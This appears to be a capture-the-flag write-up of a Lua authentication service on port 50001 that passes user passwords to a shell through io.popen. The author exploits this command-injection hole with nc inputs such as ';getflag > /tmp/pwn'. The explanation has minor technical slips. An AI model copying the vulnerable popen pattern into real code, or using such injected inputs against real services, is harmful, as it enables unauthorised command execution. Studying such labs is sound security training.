Let's take a look at the code...

```
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 50001))

function hash(password)
  prog = io.popen("echo "..password.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
      print("trying " .. line) -- log from where ;\
      local h = hash(line)

      if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
          client:send("Better luck next time\n");
      else
          client:send("Congrats, your token is 413**CARRIER LOST**\n")
      end

  end

  client:close()
end
```

So looking over this, this appears to be a lua file that does authentication. It listens for connections on port 50001, then prompts for a passwords, and sends that off to a system process to be encrypted. if the authentication is successful, then it prints out "Congrats, your token is 413**CARRIER LOST**\n". At first I tried comparing the hash against other online databases to see if I could find the orignal string, but then I noticed a bug in the program.

```
prog = io.popen("echo "..password.." | sha1sum", "r")
```

This line right here is taking user defined data (which is the password variable), and then passing it to a system process (which is what io.open() does). Even if you don't know lua, you can tell that it is this type of a vulnerabillity because of the "echo", "|", and "sha1sum" are all valid linux commands that can be executed.

So if we input this

```
$ nc 127.0.0.1 50001
Password: ;getflag
```

this

```
prog = io.popen("echo "..password.." | sha1sum", "r")
```

becomes this

```
prog = io.popen("echo "..;getflag.." | sha1sum", "r")
```

Now keep in mind that since we are replacing the echo with another command. In addition to that there is nowhere in the code that would print out the result of running getflag. However we can pipe the output to a local file.

```
$ nc 127.0.0.1 50001
Password: ;getflag > /tmp/pwn
Better luck next time
$ cat /tmp/pwn
You have successfully executes getflag on a target account
```

And just like that, we pwned the program. Now if you want to sucessfully authenticate to the program, just for fun, you can pass the hash to the program via the same exploit and it will work.

```
$ nc 127.0.0.1 50001
Password: ;4754a4f4bd5787accd33de887b9250a0691dd198;echo
Congrats, your token is 413**CARRIER LOST**
```

